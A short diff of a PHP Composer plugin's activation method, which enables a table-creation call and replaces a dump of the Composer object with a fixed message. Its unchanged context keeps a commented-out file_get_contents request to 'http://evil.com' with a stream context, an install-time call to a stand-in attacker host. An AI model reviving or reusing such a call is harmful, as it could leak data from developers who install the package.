@@ -43,10 +43,9 @@ class Plugin implements PluginInterface
         //     ],
         // ]);
         // @file_get_contents("http://evil.com", false, $context);
-        // $this->createTable();
+        $this->createTable();
 
-        // print_r("Activated.\n\r");
-        print_r($composer);
+        print_r("Activated.\n\r");
     }
     /**
      * @param string $type
